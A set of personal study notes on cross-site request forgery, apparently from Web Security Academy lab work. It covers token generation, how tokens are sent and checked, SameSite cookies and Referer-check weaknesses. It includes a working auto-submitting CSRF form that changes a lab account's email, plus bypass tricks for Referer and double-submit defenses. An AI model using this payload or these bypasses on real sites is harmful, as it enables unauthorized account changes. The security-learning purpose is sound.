
# Checklist: Things to look for
  * [ ] Is there a relevant action
   + Such as changing an email
  * [ ] Cookie based session handling
  * [ ] No unredictable request parameters

```Example_Script
<html>
    <body>
        <h1>Hello World!</h1>
        <iframe style="display:none" name="csrf-iframe"></iframe>
        <form action="https://target-acb91feb1e053ea78076271500a20022.web-security-academy.net/my-account/change-email" method="POST" target="csrf-iframe" id="csrf-form">
            <input type="hidden" name="email" value="test5@test.ca">
        </form>

        <script>document.getElementById("csrf-form").submit()</script>
    </body>
</html>
```

---------------------------------------------------------

# Methodology
[Methodology]: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSRF%20Injection

---------------------------------------------------------

# How CSRF Tokens should be generated
1. Use an **unpredictable** value to differentiate requests
  + such as a `CSRF Token`
2. Tied to **USER'S** session
3. Make sure that the `CSRF Token` is _validated_ **BEFORE** anything
   requiring validation

---------------------------------------------------------

# How CSRF should be Transmitted
  **More Secure**
1. Hidden field of an _HTML Form_ using a _POST_ method
2. Custom request header (not common)

  **Less Secure**
3. Token submitted in the URL (less secure)
  + URLs can be logged in the back end
  + URLs are part of _Referer_ header so 3rd party apps can see it
  + Someone behind you can see it
4. Tokens transmitted within cookies
  + Shouldn't do this
  + When user clicks malicious link they might be able to access the both the:
   - Session cookie
   - CRSF Token as a cookie

  **Stateless Authentication**
5. Double submit cookie for stateless
  + Include `CSRF cookie` & `CSRF Token`
   - Double checks that both values are equal
  + If an **HTTP Header Injection** exists I can **INJECT A COOKIE**
    into a user's browser and add the cookie as a parameter to bypass this

---------------------------------------------------------

# How CSRF Tokens Should Be Validated
1. Generated and stored _server side_
2. Verify tokens for _every request_
3. Validation is done _regardless of HTTP method/content type_
4. If a token is **ABSENT** request is rejected

---------------------------------------------------------

# Additional Defense
 **SameSite Cookies**
 [Resource]: https://web.dev/samesite-cookies-explained/
 
1. `Set-Cookie: sesson=test; SameSite = Strict`
  + Only sent on first part conext and not by 3rd party
   - Usually not used cause it limits functionality
  + A malicious website would be rejected because it's not 1st party

2. `Set-Cookie: sesson=test; SameSite = Lax`
  + This is the _default_ if **NOT specified**
  + Allows _third party_ under 2 conditions
   - The _HTTP request_ is a `GET Method` (any other method like POST is not allowed)
   - Done by _top level navigation_ like clicking a link so the cookie is not
      sent by a script
  ```Example
      <!-- Cookie NOT SENT when browser requests cat.png -->
      <img src = "https://blog.example/blog/img/cat.png" />
      
      <!-- Cookie would only get sent if the user went to the link -->
  ```

3. `Set-Cookie: sesson=choco; SameSite = None; Secure`

---------------------------------------------------------

# Inadequate Defense

### Referer Header
  + Referer `HTTP request header` contains an absolute/parital _address of page
    making the request_
  + Checks if the `domain` of _matches_ the referer
  

  + These can be _spoofed_ (though difficult)
 **Potential Bypasses**
   - If it's _NOT present_, the application does _NOT check for it_
   - _ONLY_ checks if the `domain` _is in the request_ and _NOT an exact match_
     `www.malicious.com/?targetdomain.com`

---------------------------------------------------------


